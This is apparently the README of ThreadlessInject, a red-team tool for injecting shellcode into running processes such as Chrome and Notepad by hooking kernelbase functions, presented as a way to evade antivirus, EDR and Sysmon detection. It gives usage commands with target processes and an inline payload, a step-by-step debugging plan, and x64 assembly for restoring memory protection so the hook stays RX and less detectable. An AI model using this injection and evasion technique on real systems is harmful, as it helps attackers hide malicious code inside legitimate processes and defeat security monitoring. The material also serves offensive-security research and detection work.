# Threadless Process Injection

From my Bsides Cymru 2023 talk: **[Needles Without the Thread](https://pretalx.com/bsides-cymru-2023-2022/talk/BNC8W3/)**.

> As red teamers, we always find ourselves in a cat and mouse game with the blue team. Many Anti-virus and EDR solutions over the past 10 years have become significantly more advanced at detecting fileless malware activity in a generic way.
>
> Process injection, a technique used for executing code from within the address space of another process is a common method within the offensive operator’s toolbox. Commonly used to mask activity within legitimate processes such as browsers and instant messaging clients already running on the target workstation.
>
> Within the last 2 years, tools such as Sysmon have added new detections and events for process injection along with big improvements in detections within commercial EDR space.
> With this in mind, a new method of injection was researched that would not fall foul to the traditional methods that are often detected today.

# Usage

```powershell
# inject calc-loader-shellcode into Chrome's kernelbase.dll!CreateEventW
.\ThreadlessInject.exe -p (Get-Process "Chrome").id -d kernelbase.dll -e CreateEventW
```

```powershell
# inject ret-0-shellcode into Notepads's kernelbase.dll!MapViewOfFileEx
.\ThreadlessInject.exe -p (Get-Process "Notepad").id -d kernelbase.dll -e MapViewOfFileEx -x "SDHAww=="
```

## Possible Improvements

- [x] Use more covert allocation and write primitives.
- [ ] Use patchless hooking via debugger attachment and hardware breakpoints [(https://www.pentestpartners.com/security-blog/patchless-amsi-bypass-using-sharpblock)](https://www.pentestpartners.com/security-blog/patchless-amsi-bypass-using-sharpblock/).
- [x] Avoid RWX on hooked function.  Hook assembly will need to handle VirtualProtect calls.
- [x] Support any DLL via remote module enumeration.

### Debugging Plan for RWX Avoidance
#### Check current flow
* Increase the injectors timeout to 60min in Main()
* Execute the target (e.g. Notepad) and attach a debugger
* Set a breakpoint on the target function (e.g. `bp kernelbase!MapViewOfFileEx`)
* Print the start of the original (unhooked) function with `u kernelbase!MapViewOfFileEx L3`
* Print the mem protection with `!vprot kernelbase!MapViewOfFileEx`, should be RX
* Execute the injector `.\ThreadlessInject.exe -p (Get-Process "Notepad").id -d kernelbase.dll -e MapViewOfFileEx`
* Print the mem protection again with `!vprot kernelbase!MapViewOfFileEx`, should be RWX
* Continue the debugged process and let the breakpoint hit (e.g. press save in Notepad)
* Note the new call instruction at the start of the now hooked function
* Set a second breakpoint in the code cave (where the loader shellcode is injected e.g. `bp 00007ffcfb520000`)
* Continue again and the loader shellcode should be hit
* Continue again and calc should pop

#### Update the code logic
* Reset the hooked function memory protection to RX again right after the hook is written
* Update the restore section in the shellcode loader itself
    * Right be before the movabs,mov instructions a VirtualProctect must set RWX to the hooked function
    * The hooked function is restored with movabs,mov
    * Immidiately after mov a VirtualProctect must reset to RX

#### Update the loader shellcode
```asm
sub rsp, 30h          ; Allocate shadow space (20h) + extra space for oldProtect variable (8h)
mov rcx, hookedFunc   ; Arg 1: The Address of the hooked function
mov rdx, 8            ; Arg 2: Size (only the first 8 bytes must be overwritten)
mov r8, 40h           ; Arg 3: New protect (PAGE_EXECUTE_READWRITE)
lea r9, [rsp + 20h]   ; Arg 4: Point out variable r9 to a temporary stack
mov rax, VirtProt     ; addr of VirtualProtect, must be calculated and written by injector
call rax
add rsp, 30h          ; Clean up stack
```

#### Check the new flow
* Execute the target (e.g. Notepad) and attach a debugger
* Set a breakpoint on the target function (e.g. `bp kernelbase!MapViewOfFileEx`)
* Print the start of the original (unhooked) function with `u kernelbase!MapViewOfFileEx L3`
* Print the mem protection with `!vprot kernelbase!MapViewOfFileEx`, should be RX
* Execute the injector `.\ThreadlessInject.exe -p (Get-Process "Notepad").id -d kernelbase.dll -e MapViewOfFileEx`
* Print the mem protection again with `!vprot kernelbase!MapViewOfFileEx`, **should STILL be RX**
* Continue the debugged process and let the breakpoint hit (e.g. press save in Notepad)
* Note the new call instruction at the start of the now hooked function
* Set a second breakpoint in the code cave (where the loader shellcode is injected e.g. `bp 00007ffcfb520000`)
* Continue again and the loader shellcode should be hit
* Single step to debug the new restore logic
* Continue again and calc should pop
* ?
* Profit